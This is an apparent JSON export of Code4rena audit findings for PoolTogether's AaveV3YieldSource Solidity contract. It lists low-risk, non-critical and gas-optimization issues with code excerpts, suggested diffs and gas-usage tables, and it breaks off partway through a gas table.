    "body": "## Low Risk Issues\n\n### 1. `safeApprove()` is deprecated\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n183       IERC20(_tokenAddress()).safeApprove(address(_pool()), type(uint256).max);\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L183\n\n### 2. Comments should be enforced with `require()`s\nThe comment below should be enforced with `require(decimals_ == _aToken.decimals())`. If this seems excessive, then why require `decimals_` be passed in at all? Why isn't `_aToken.decimals()` stored instead?\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n156     * @param decimals_ Number of decimals the shares (inhereted ERC20) will have. Same as underlying asset to ensure sane exchange rates for shares.\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L156\n\n### 3. Formula does not match what the code is doing\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n360      // shares = (tokens * totalShares) / yieldSourceATokenTotalSupply\n361      return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));\n```\nshould be `// shares = (tokens * totalSupply) / yieldSourceBalanceOfAToken`\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L360-L361\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n372      // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares\n373      return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);\n```\nshould be `// tokens = (shares * yieldSourceBalanceOfAToken) / totalSupply`\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L372-L373\n\n### 4. Revert if amount is zero\nThere is already a check in one of the functions that the final token amount is not zero, but it would be better to check the input amount first in _all_ functions that take in an amount\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n231    function supplyTokenTo(uint256 _depositAmount, address _to) external override nonReentrant {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L231\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n251    function redeemToken(uint256 _redeemAmount) external override nonReentrant returns (uint256) {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L251\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n332    function transferERC20(\n333      IERC20 _token,\n334      address _to,\n335      uint256 _amount\n336    ) external onlyManagerOrOwner {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L332-L336\n\n\n## Non-critical Issues\n\n### 1. Consider making whether to `safeApprove()` be based on a constructor argument\nApprovals are only needed if doing flash loans or liquidations. If these are not used by the strategy, there is no need for the approval, which will lower the attack surface.\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n183      IERC20(_tokenAddress()).safeApprove(address(_pool()), type(uint256).max);\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L183\n\n### 2. Function state mutability can be restricted to view\nThe compiler warns about this issue during compilation. Add the `view` visibility to resolve the warning\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n203    function balanceOfToken(address _user) external override returns (uint256) {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L203\n\n### 3. `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n211   function depositToken() public view override returns (address) {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L211\n\n### 4. Inconsistent variable-name-to-variable-type usage\nIn the case below `_token` is an `address` whereas in all other instances, `_token` is an `IERC20`. Changing the name of the variable to something like `_tokenAddr` will make the code more readable and consistent\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n348    function _requireNotAToken(address _token) internal view {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L348\n\n### 5. Typos\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n38      * @param decimals Number of decimals the shares (inhereted ERC20) will have. Same as underlying asset to ensure sane exchange rates for shares.\n```\ninhereted\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L38\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n156      * @param decimals_ Number of decimals the shares (inhereted ERC20) will have. Same as underlying asset to ensure sane exchange rates for shares.\n```\ninhereted\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L156\n\n### 6. Grammar\nA lot of the NatSpec/comments add a period to the end of fragments. Periods should only be used when there is both a noun phrase and a verb phrase\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol (various lines)   #1\n\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol\n\n### 7. Use a more recent version of solidity\nUse a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n3   pragma solidity 0.8.10;\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L3\n\n### 8. Function behavior doesn't match name\nThe line below should use `_requireNotAToken()` but it doesn't because that function's `revert()` string specifically refers to the 'allowance' functions. The function NatSpec doesn't mention this fact. If the function wants different strings based on where it's called from, it can use `msg.sig` to choose the right one. An even better approach would be to have a custom error instead of a revert string, and include the `msg.sig` as an argument to the error.\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n337      require(address(_token) != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L337\n\n### 9. Unneeded functions\nThe `transferERC20()` function is sufficient for handling unexpected tokens; the increase/decrease allowance functions aren't useful. Approval isn't required for the contract itself to do the transfer when told to do it, but the increase function requires a second operation to actually do the transfer. Even if there is a case where funds can be moved by an existing contract's functionality, that contract might pass along its own token to this contract, starting another issue. The increase/decrease functions just add an extra attack surface and should just be removed.\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n315    function increaseERC20Allowance(\n316      IERC20 _token,\n317      address _spender,\n318      uint256 _amount\n319    ) external onlyManagerOrOwner {\n320      _requireNotAToken(address(_token));\n321      _token.safeIncreaseAllowance(_spender, _amount);\n322      emit IncreasedERC20Allowance(msg.sender, _spender, _amount, _token);\n323    }\n324  \n325    /**\n326     * @notice Transfer ERC20 tokens other than the aTokens held by this contract to the recipient address.\n327     * @dev This function is only callable by the owner or asset manager.\n328     * @param _token Address of the ERC20 token to transfer\n329     * @param _to Address of the recipient of the tokens\n330     * @param _amount Amount of tokens to transfer\n331     */\n332    function transferERC20(\n333      IERC20 _token,\n334      address _to,\n335      uint256 _amount\n336    ) external onlyManagerOrOwner {\n337      require(address(_token) != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n338      _token.safeTransfer(_to, _amount);\n339      emit TransferredERC20(msg.sender, _to, _amount, _token);\n340    }\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L315-L340\n\n### 10. Natspec descriptions incorrect\nThe instances below say that the argument is an `address` but they're in fact all variables of type contract. Internally solidity translates contracts to addresses when passing them to `abi` calls and when emitting events, but the compiler requires the specific user-defined type and errors if a simple address is provided without a cast instead.\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n33     * @param aToken Aave aToken address\n34     * @param rewardsController Aave rewardsController address\n35     * @param poolAddressesProviderRegistry Aave poolAddressesProviderRegistry address\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L33-L35\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n87     * @param token Address of the ERC20 token to decrease allowance for\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L87\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n101     * @param token Address of the ERC20 token to increase allowance for\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L101\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #4\n\n115     * @param token Address of the ERC20 token transferred\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L115\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #5\n\n126    /// @notice Yield-bearing Aave aToken address.\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L126\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #6\n\n129    /// @notice Aave RewardsController address.\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L129\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #7\n\n132    /// @notice Aave poolAddressesProviderRegistry address.\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L132\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #8\n\n151     * @param _aToken Aave aToken address\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L151\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #9\n\n152     * @param _rewardsController Aave rewardsController address\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L152\n\n### 11. Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n41     event AaveV3YieldSourceInitialized(\n42       IAToken indexed aToken,\n43       IRewardsController rewardsController,\n44       IPoolAddressesProviderRegistry poolAddressesProviderRegistry,\n45       string name,\n46       string symbol,\n47       uint8 decimals,\n48       address owner\n49     );\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L41-L49\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n58     event SuppliedTokenTo(address indexed from, uint256 shares, uint256 amount, address indexed to);\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L58\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n66     event RedeemedToken(address indexed from, uint256 shares, uint256 amount);\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L66\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #4\n\n75     event Claimed(\n76       address indexed from,\n77       address indexed to,\n78       address[] rewardsList,\n79       uint256[] claimedAmounts\n80     );\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L75-L80\n\n### 12. Non-exploitable re-entrancies\nCode should follow the best-practice of [check-effects-interaction](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/checks-effects-interactions/)\n\n```\nReentrancy in AaveV3YieldSource.supplyTokenTo(uint256,address) (contracts/AaveV3YieldSource.sol#231-242):  #1\n    External calls:\n    - IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender,address(this),_depositAmount) (contracts/AaveV3YieldSource.sol#236)\n    - _pool().supply(_underlyingAssetAddress,_depositAmount,address(this),REFERRAL_CODE) (contracts/AaveV3YieldSource.sol#237)\n    State variables written after the call(s):\n    - _mint(_to,_shares) (contracts/AaveV3YieldSource.sol#239)\n        - _totalSupply += amount (node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol#262)\n```\n\n```\nReentrancy in AaveV3YieldSource.supplyTokenTo(uint256,address) (contracts/AaveV3YieldSource.sol#231-242):  #2\n    External calls:\n    - IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender,address(this),_depositAmount) (contracts/AaveV3YieldSource.sol#236)\n    - _pool().supply(_underlyingAssetAddress,_depositAmount,address(this),REFERRAL_CODE) (contracts/AaveV3YieldSource.sol#237)\n    State variables written after the call(s):\n    - _mint(_to,_shares) (contracts/AaveV3YieldSource.sol#239)\n        - _balances[account] += amount (node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol#263)\n```\n\n```\nReentrancy in AaveV3YieldSource.claimRewards(address) (contracts/AaveV3YieldSource.sol#275-286):  #3\n    External calls:\n    - (_rewardsList,_claimedAmounts) = rewardsController.claimAllRewards(_assets,_to) (contracts/AaveV3YieldSource.sol#281-282)\n    Event emitted after the call(s):\n    - Claimed(msg.sender,_to,_rewardsList,_claimedAmounts) (contracts/AaveV3YieldSource.sol#284)\n```\n\n```\nReentrancy in AaveV3YieldSource.decreaseERC20Allowance(IERC20,address,uint256) (contracts/AaveV3YieldSource.sol#296-304):  #4\n    External calls:\n    - _token.safeDecreaseAllowance(_spender,_amount) (contracts/AaveV3YieldSource.sol#302)\n    Event emitted after the call(s):\n    - DecreasedERC20Allowance(msg.sender,_spender,_amount,_token) (contracts/AaveV3YieldSource.sol#303)\n```\n\n```\nReentrancy in AaveV3YieldSource.increaseERC20Allowance(IERC20,address,uint256) (contracts/AaveV3YieldSource.sol#315-323):  #5\n    External calls:\n    - _token.safeIncreaseAllowance(_spender,_amount) (contracts/AaveV3YieldSource.sol#321)\n    Event emitted after the call(s):\n    - IncreasedERC20Allowance(msg.sender,_spender,_amount,_token) (contracts/AaveV3YieldSource.sol#322)\n```\n\n```\nReentrancy in AaveV3YieldSource.redeemToken(uint256) (contracts/AaveV3YieldSource.sol#251-267):  #6\n    External calls:\n    - _pool().withdraw(_underlyingAssetAddress,_redeemAmount,address(this)) (contracts/AaveV3YieldSource.sol#259)\n    - _assetToken.safeTransfer(msg.sender,_balanceDiff) (contracts/AaveV3YieldSource.sol#263)\n    Event emitted after the call(s):\n    - RedeemedToken(msg.sender,_shares,_redeemAmount) (contracts/AaveV3YieldSource.sol#265)\n```\n\n```\nReentrancy in AaveV3YieldSource.supplyTokenTo(uint256,address) (contracts/AaveV3YieldSource.sol#231-242):  #7\n    External calls:\n    - IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender,address(this),_depositAmount) (contracts/AaveV3YieldSource.sol#236)\n    - _pool().supply(_underlyingAssetAddress,_depositAmount,address(this),REFERRAL_CODE) (contracts/AaveV3YieldSource.sol#237)\n    Event emitted after the call(s):\n    - SuppliedTokenTo(msg.sender,_shares,_depositAmount,_to) (contracts/AaveV3YieldSource.sol#241)\n    - Transfer(address(0),account,amount) (node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol#264)\n        - _mint(_to,_shares) (contracts/AaveV3YieldSource.sol#239)\n```\n\n```\nReentrancy in AaveV3YieldSource.transferERC20(IERC20,address,uint256) (contracts/AaveV3YieldSource.sol#332-340):  #8\n    External calls:\n    - _token.safeTransfer(_to,_amount) (contracts/AaveV3YieldSource.sol#338)\n    Event emitted after the call(s):\n    - TransferredERC20(msg.sender,_to,_amount,_token) (contracts/AaveV3YieldSource.sol#339)\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/85"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### 1. State variables only set in the constructor should be declared `immutable`\nAvoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a `PUSH32` (3 gas)\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n127     IAToken public aToken;\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L127\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n130     IRewardsController public rewardsController;\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L130\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n133     IPoolAddressesProviderRegistry public poolAddressesProviderRegistry;\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L133\n\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..1d229ff 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -124,13 +124,13 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n   /* ============ Variables ============ */\n \n   /// @notice Yield-bearing Aave aToken address.\n-  IAToken public aToken;\n+  IAToken public immutable aToken;\n \n   /// @notice Aave RewardsController address.\n-  IRewardsController public rewardsController;\n+  IRewardsController public immutable rewardsController;\n \n   /// @notice Aave poolAddressesProviderRegistry address.\n-  IPoolAddressesProviderRegistry public poolAddressesProviderRegistry;\n+  IPoolAddressesProviderRegistry public immutable poolAddressesProviderRegistry;\n \n   /// @notice ERC20 token decimals.\n   uint8 private immutable _decimals;\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..a6cd51d 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -5,21 +5,21 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Contract                  ·  Method                  ·  Min        ·  Max        ·  Avg        ·  # calls      ·  usd (avg)  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  claimRewards            ·      54735  ·      56896  ·      55816  ·            4  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  claimRewards            ·      50521  ·      52682  ·      51602  ·            4  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  decreaseERC20Allowance  ·      37465  ·      39638  ·      38910  ·            3  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  decreaseERC20Allowance  ·      35374  ·      37547  ·      36819  ·            3  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  increaseERC20Allowance  ·      59133  ·      61618  ·      61212  ·            7  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  increaseERC20Allowance  ·      57042  ·      59527  ·      59121  ·            7  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  mint                    ·      51381  ·      68493  ·      61904  ·           13  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     110713  ·            1  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     106359  ·            1  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  setManager              ·          -  ·          -  ·      47982  ·            4  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110668  ·     153720  ·     142217  ·            6  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     106314  ·     149466  ·     137930  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  transferERC20           ·      56227  ·      58376  ·      57302  ·            2  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  ERC20Mintable             ·  approve                 ·      26692  ·      46592  ·      43275  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2497750  ·    2497762  ·    2497760  ·        8.3 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n\n\n### 2. `internal` functions only called once can be inlined to save gas\nNot inlining costs 20 to 40 gas because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n369     function _sharesToToken(uint256 _shares) internal view returns (uint256) {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L369\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n388     function _poolProvider() internal view returns (IPoolAddressesProvider) {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L388\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..d7ec7ec 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -201,7 +201,12 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    * @return The underlying balance of asset tokens.\n    */\n   function balanceOfToken(address _user) external override returns (uint256) {\n-    return _sharesToToken(balanceOf(_user));\n+    uint256 _shares = balanceOf(_user);\n+    uint256 _supply = totalSupply();\n+\n+    // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares\n+    return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);\n+ \n   }\n \n   /**\n@@ -361,18 +366,6 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));\n   }\n \n-  /**\n-   * @notice Calculates the number of asset tokens a user has in the yield source.\n-   * @param _shares Amount of shares\n-   * @return Number of asset tokens.\n-   */\n-  function _sharesToToken(uint256 _shares) internal view returns (uint256) {\n-    uint256 _supply = totalSupply();\n-\n-    // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares\n-    return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);\n-  }\n-\n   /**\n    * @notice Returns the underlying asset token address.\n    * @return Underlying asset token address.\n@@ -381,22 +374,13 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     return aToken.UNDERLYING_ASSET_ADDRESS();\n   }\n \n-  /**\n-   * @notice Retrieves Aave PoolAddressesProvider address.\n-   * @return A reference to PoolAddressesProvider interface.\n-   */\n-  function _poolProvider() internal view returns (IPoolAddressesProvider) {\n-    return\n-      IPoolAddressesProvider(\n-        poolAddressesProviderRegistry.getAddressesProvidersList()[ADDRESSES_PROVIDER_ID]\n-      );\n-  }\n-\n   /**\n    * @notice Retrieves Aave Pool address.\n    * @return A reference to Pool interface.\n    */\n   function _pool() internal view returns (IPool) {\n-    return IPool(_poolProvider().getPool());\n+    return IPool(IPoolAddressesProvider(\n+        poolAddressesProviderRegistry.getAddressesProvidersList()[ADDRESSES_PROVIDER_ID]\n+      ).getPool());\n   }\n }\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..6948266 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -13,11 +13,11 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  mint                    ·      51381  ·      68493  ·      61904  ·           13  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     110713  ·            1  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     110678  ·            1  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  setManager              ·          -  ·          -  ·      47982  ·            4  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110668  ·     153720  ·     142217  ·            6  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110633  ·     153685  ·     142182  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2559043  ·    2559055  ·    2559053  ·        8.5 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n### 3. Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement\nThis change saves [6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png) per instance\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n179       require(decimals_ > 0, \"AaveV3YS/decimals-gt-zero\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L179\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n233       require(_shares > 0, \"AaveV3YS/shares-gt-zero\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L233\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..e00ad47 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -176,7 +176,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n \n     require(_owner != address(0), \"AaveV3YS/owner-not-zero-address\");\n \n-    require(decimals_ > 0, \"AaveV3YS/decimals-gt-zero\");\n+    require(decimals_ != 0, \"AaveV3YS/decimals-gt-zero\");\n     _decimals = decimals_;\n \n     // Approve once for max amount\n@@ -230,7 +230,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    */\n   function supplyTokenTo(uint256 _depositAmount, address _to) external override nonReentrant {\n     uint256 _shares = _tokenToShares(_depositAmount);\n-    require(_shares > 0, \"AaveV3YS/shares-gt-zero\");\n+    require(_shares != 0, \"AaveV3YS/shares-gt-zero\");\n \n     address _underlyingAssetAddress = _tokenAddress();\n     IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender, address(this), _depositAmount);\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..9a90ad3 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -17,7 +17,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  setManager              ·          -  ·          -  ·      47982  ·            4  ·          -  │\n 